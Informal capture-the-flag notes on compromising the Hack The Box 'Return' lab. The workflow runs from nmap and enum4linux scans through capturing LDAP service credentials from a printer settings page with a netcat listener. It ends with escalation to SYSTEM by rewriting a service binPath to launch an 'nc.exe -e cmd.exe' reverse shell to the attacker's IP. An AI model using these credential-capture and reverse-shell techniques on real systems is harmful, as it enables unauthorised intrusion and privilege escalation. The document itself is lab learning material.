at 80 we have a printer panel open

```
─# nmap 10.10.11.108
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 00:57 EDT
Nmap scan report for 10.10.11.108
Host is up (0.085s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

```

in settings page we see
 printer.return.local
 389
 svc-printer
 ******

tried adding it to /etc/hosts but nothing came up

looking at walkthough

we can enumaerate smb using enum4linux

```
└─# enum4linux -a 10.10.11.108
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul  7 01:08:18 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.108
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.108    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.11.108    |
 ============================================ 
Looking up status of 10.10.11.108
No reply from 10.10.11.108

 ===================================== 
|    Session Check on 10.10.11.108    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.11.108 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.11.108    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: RETURN
Domain Sid: S-1-5-21-3750359090-2939318659-876128439
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.11.108    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.11.108 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.11.108 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.11.108    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.11.108    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.11.108

 ==================================================== 
|    Password Policy Information for 10.10.11.108    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.11.108 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.108)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.11.108    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.108 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.11.108    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu Jul  7 01:08:52 2022
```

we see the domain name retirn

set up a listener on port 389 

and specify tunnel ip in the settings field

however nothing happens
```html
<form action="" method="POST">
        <table>
          <tbody><tr>
            <td>Server Address</td>
            <td><input type="text" name="ip" value="printer.return.local"></td>
          </tr>
          <tr>
            <td>Server Port</td>
            <td><input type="text" value="389"></td>
          </tr>
          <tr>
            <td>Username</td>
            <td><input type="text" value="svc-printer"></td>
          </tr>
          <tr>
            <td>Password</td>
            <td><input type="text" value="*******"></td>
          </tr>
          <tr>
            <td colspan="3"><input type="submit" value="Update"></td>
          </tr>
        </tbody></table>
      </form>
```

however lets try using evilwinrm with credentials anyway


retrying on got

```
└─# nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 51618
0*`%return\svc-printer�
                       1edFg43012!!

```

evil winrm
```
evil-winrm -i 10.10.14.17 -u svc-printer -p '1edFg43012!!'

```


got a shell

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> type ../Desktop/user.txt
bc814b4190a6999bd54a5e1479f11475
```

# for root

```

*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```

uploading netcat using winrm

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /usr/share/windows-resources/binaries/nc.exe
Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Documents\nc.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!

```

configuring sc.exe

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.17 1234"
[SC] ChangeServiceConfig SUCCESS

```


then running 

````
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss


````


flag would be at C:\Users\Administrator\Desktop

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
266dfdefeb384083c003a8fce1a7bb9e

```


## more notes
for privilege escalation we can use

`net user svc-printer`

this will give us the group and then further

```
Privilege Escalation
Enumerating group memberships reveals that svc-printer is part of Server Operators group.
We can read more about this group here. Members of this group can start/stop system services. Let's
modify a service binary path to obtain reverse shell.
Stand up a listener on port 1234 and issue below commands to obtain reverse shell.
upload /usr/share/windows-resources/binaries/nc.exe
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2
1234"
sc.exe stop vss
sc.exe start vss
```

following https://www.izenynn.com/2022/05/09/htb-return/

`crackmapexec smb 10.129.111.124`

to list smb shares

`❯ crackmapexec smb 10.129.111.124 --shares -u svc-printer -p '1edFg43012!!'
SMB         10.129.111.124  445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.111.124  445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.129.111.124  445    PRINTER          [+] Enumerated shares
SMB         10.129.111.124  445    PRINTER          Share           Permissions     Remark
SMB         10.129.111.124  445    PRINTER          -----           -----------     ------
SMB         10.129.111.124  445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.129.111.124  445    PRINTER          C$              READ,WRITE      Default share
SMB         10.129.111.124  445    PRINTER          IPC$            READ            Remote IPC
SMB         10.129.111.124  445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.129.111.124  445    PRINTER          SYSVOL          READ            Logon server share `

